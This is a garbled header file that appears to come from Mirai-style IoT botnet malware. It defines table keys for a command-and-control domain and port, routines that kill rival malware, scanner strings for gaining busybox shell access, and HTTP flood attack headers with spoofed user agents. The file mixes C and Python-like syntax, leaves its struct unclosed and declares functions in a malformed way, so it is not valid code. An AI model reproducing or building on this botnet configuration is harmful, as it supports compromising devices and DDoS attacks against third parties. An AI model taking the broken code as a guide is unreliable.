#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
#ifdef DEBUG
    BOOL locked
#endif

# Generic bot info 
TABLE_PROCESS_ARGV	= 1
TABLE_EXEC_SUCCESS	= 2
TABLE_CNC_DOMAIN	= 3
TABLE_CNC_PORT	= 4
          
# Killer data           
TABLE_KILLER_SAFE	= 5
TABLE_KILLER_PROC	= 6
TABLE_KILLER_EXE	= 7
TABLE_KILLER_DELETED	= 8   # " (deleted)" 
TABLE_KILLER_FD	= 9   # "/fd" 
TABLE_KILLER_ANIME	= 10  # .anime 
TABLE_KILLER_STATUS	= 11
TABLE_MEM_QBOT	= 12
TABLE_MEM_QBOT2	= 13
TABLE_MEM_QBOT3	= 14
TABLE_MEM_UPX	= 15
TABLE_MEM_ZOLLARD	= 16
TABLE_MEM_REMAITEN	= 17
          
# Scanner data           
TABLE_SCAN_CB_DOMAIN	= 18  # domain to connect to 
TABLE_SCAN_CB_PORT	= 19  # Port to connect to 
TABLE_SCAN_SHELL	= 20  # 'shell' to enable shell access 
TABLE_SCAN_ENABLE	= 21  # 'enable' to enable shell access 
TABLE_SCAN_SYSTEM	= 22  # 'system' to enable shell access 
TABLE_SCAN_SH	= 23  # 'sh' to enable shell access 
TABLE_SCAN_QUERY	= 24  # echo hex string to verify login 
TABLE_SCAN_RESP	= 25  # utf8 version of query string 
TABLE_SCAN_NCORRECT	= 26  # 'ncorrect' to fast-check for invalid password 
TABLE_SCAN_PS	= 27  # "/bin/busybox ps" 
TABLE_SCAN_KILL_9	= 28  # "/bin/busybox kill -9 " 
          
# Attack strings           
TABLE_ATK_VSE	= 29  # TSource Engine Query 
TABLE_ATK_RESOLVER	= 30  # /etc/resolv.conf 
TABLE_ATK_NSERV	= 31  # "nameserver " 

TABLE_ATK_KEEP_ALIVE	= 32  # "Connection: keep-alive" 
TABLE_ATK_ACCEPT	= 33  # "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" // */
TABLE_ATK_ACCEPT_LNG	= 34  # "Accept-Language: en-US,en;q=0.8"
TABLE_ATK_CONTENT_TYPE	= 35  # "Content-Type: application/x-www-form-urlencoded"
TABLE_ATK_SET_COOKIE	= 36  # "setCookie('"
TABLE_ATK_REFRESH_HDR	= 37  # "refresh:"
TABLE_ATK_LOCATION_HDR	= 38  # "location:"
TABLE_ATK_SET_COOKIE_HDR	= 39  # "set-cookie:"
TABLE_ATK_CONTENT_LENGTH_HDR	= 40  # "content-length:"
TABLE_ATK_TRANSFER_ENCODING_HDR	= 41  # "transfer-encoding:"
TABLE_ATK_CHUNKED	= 42  # "chunked"
TABLE_ATK_KEEP_ALIVE_HDR	= 43  # "keep-alive"
TABLE_ATK_CONNECTION_HDR	= 44  # "connection:"
TABLE_ATK_DOSARREST	= 45  # "server: dosarrest"
TABLE_ATK_CLOUDFLARE_NGINX	= 46  # "server: cloudflare-nginx"

# User agent strings 
TABLE_HTTP_ONE	= 47  # "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
TABLE_HTTP_TWO	= 48  # "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" 
TABLE_HTTP_THREE	= 49  # "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
TABLE_HTTP_FOUR	= 50  # "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" 
TABLE_HTTP_FIVE	= 51  # "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7" 

TABLE_MAX_KEYS	= 52 # Highest value + 1 
 

static add_entry(uint8_t, , int)
static toggle_obf(uint8_t)
